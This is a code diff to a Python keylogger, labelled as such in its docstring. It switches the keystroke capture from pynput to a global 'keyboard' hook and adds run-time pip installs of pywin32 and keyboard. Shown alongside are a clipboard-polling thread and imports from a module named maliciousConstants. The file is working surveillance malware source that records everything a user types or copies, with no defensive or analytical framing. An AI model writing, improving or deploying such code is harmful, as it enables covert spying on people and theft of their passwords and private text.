@@ -3,15 +3,18 @@ Edan Jacobson
 Keylogger that logs clipboard and keyboard
 """
 from datetime import datetime
+import subprocess
+import sys
+
+subprocess.run([sys.executable, "-m", "pip", "install", "pywin32"], check=True)
+subprocess.run([sys.executable, "-m", "pip", "install", "keyboard"], check=True)
 
 import win32clipboard
-from pynput import keyboard
-
+import keyboard  
 import time
-
 import threading
+from maliciousConstants import SLEEP, BACKSPACE, NEW_LINE, TAB, SPACE, REMOVE_FIRST
 
-from malicious.maliciousConstants import SLEEP, BACKSPACE, NEW_LINE, TAB, SPACE, REMOVE_FIRST
 
 
 class Keylogger:
@@ -27,8 +30,8 @@ class Keylogger:
         self.clip_thread = threading.Thread(target=self.clipboard_tracker)
         self.clip_thread.start()
         # Start a thread to track the keyboard
-        self.key_thread = keyboard.Listener(on_press=self.keyboard_tracker)
-        self.key_thread.start()
+        self.key_thread = keyboard.hook(self.keyboard_tracker)
+        #self.key_thread.start()
 
     def clipboard_tracker(self):
         """
@@ -51,40 +54,37 @@ class Keylogger:
             # Wait for 0.5 seconds
             time.sleep(SLEEP)
 
-    def keyboard_tracker(self, key):
-        """
-        Method that tracks and stores in file the
-        keys/the text from keyboard
-        """
-        # Fix issue if control is pressed
+    def keyboard_tracker(self, event):
+        key = event.name
 
-        # If the backspace key is pressed
-        if key == keyboard.Key.backspace:
-            self.logged_data.append(BACKSPACE)
-        # If any other key is pressed
-        else:
-
-            if key == keyboard.Key.enter:
-                # If the enter key is pressed, write a newline character
-                self.logged_data.append(NEW_LINE)
-            elif key == keyboard.Key.tab:
-                # If the tab key is pressed, write a tab character
-                self.logged_data.append(TAB)
-            elif key == keyboard.Key.space:
-                # If the space key is pressed, write a space character
-                self.logged_data.append(SPACE)
-            elif key == keyboard.Key.shift:
-                # If the shift key is pressed, do nothing
-                pass
-            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
-                # If the control key is pressed, do nothing
-                pass
-            elif key == keyboard.Key.esc:
-                # If the escape key is pressed, return
-                return
+        if event.event_type == keyboard.KEY_DOWN:
+            # If the backspace key is pressed
+            if key == 'backspace':
+                self.logged_data.append(BACKSPACE)
+            # If any other key is pressed
             else:
-                # Write the key to the file, removing the single quotes
-                self.logged_data.append(str(key).strip("'"))
+                if key == 'enter':
+                    # If the enter key is pressed, write a newline character
+                    self.logged_data.append(NEW_LINE)
+                elif key == 'tab':
+                    # If the tab key is pressed, write a tab character
+                    self.logged_data.append(TAB)
+                elif key == 'space':
+                    # If the space key is pressed, write a space character
+                    self.logged_data.append(SPACE)
+                elif key == 'shift':
+                    # If the shift key is pressed, do nothing
+                    pass
+                elif key == 'ctrl_l' or key == 'ctrl_r':
+                    # If the control key is pressed, do nothing
+                    pass
+                elif key == 'esc':
+                    # If the escape key is pressed, return
+                    return
+                else:
+                    # Write the key to the file, removing the single quotes
+                    self.logged_data.append(key)
+
 
     def remove_copied(self):
         """
